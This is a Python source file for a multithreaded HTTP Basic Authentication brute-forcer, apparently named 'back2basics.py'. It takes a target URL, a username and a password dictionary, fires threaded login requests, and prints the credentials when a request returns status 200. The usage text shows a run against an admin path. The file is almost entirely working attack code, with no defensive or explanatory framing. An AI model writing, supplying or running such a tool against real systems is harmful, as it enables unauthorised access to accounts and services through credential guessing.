import requests
from threading import Thread
import sys
from termcolor import colored
import getopt

global hit
hit = "1" # Flag to know when we have a valid password


def banner():
    print("\n********************")
    print('*  BasicAuth bruteforcer  *')
    print("********************")



def usage():
    print("Usage:")
    print("         -w: url (http://somesite.com/FUZZ")
    print("         -t: threads")
    print("         -u: username")
    print("         -f: dictionary file \n")
    print("example: back2basics.py -w http://targetsite.com/admin -u admin -t 5 -f common.txt\n")


class request_performer(Thread):
    def __init__(self, passwd, url, user):
        Thread.__init__(self)
        try:
            self.password = passwd.split("\n")[0]
            self.url = url
            self.username = user
            print("- " + self.password + " -")

        except Exception as e:
            print(e)

    def run(self):
        global hit
        if hit == "1":
            try:
                r = requests.get(self.url, auth=(self.username, self.password))

                if r.status_code == 200:
                    hit = "0"
                    print("[++++] Password FOUND for user:  "+ colored(self.username, "green") + " password is "
                          + colored(self.password, 'green') + " - !!!!")
                    sys.exit()
                else:
                    print("Not valid " + self.password)
                    i[0] = i[0] - 1  # удаляем одну нить из счетчика
            except Exception as e:
                print(e)


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "w:u:t:f:")
    except getopt.GetoptError:
        print("Error en arguments")
        sys.exit()

    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-f':
            dict = arg
        elif opt == '-t':
            threads = int(arg)
        elif opt == '-u':
            username = arg

    try:
        f = open(dict, "r")
        passwds = f.readlines()
    except:
        print("Failed opening file: " + dict)
        sys.exit()

    launcher_thread(passwds, threads, url, username)


def launcher_thread(passwd, th, url, username):
    global i
    i = []
    i.append(0)


    while len(passwd):
        if hit == "1":
            try:
                if i[0] < th:
                    n = passwd.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(n, url, username)
                    thread.start()

            except KeyboardInterrupt:
                print("Back2basics interrupted by user. Finishing attack...")
                sys.exit()
            thread.join()
    return


if __name__ == "__main__":
    try:
        if hit == "1":
            start(sys.argv[1:])
        else:
            sys.exit()
    except KeyboardInterrupt:
        print("Back interrupted by user, killing all threads..!!")
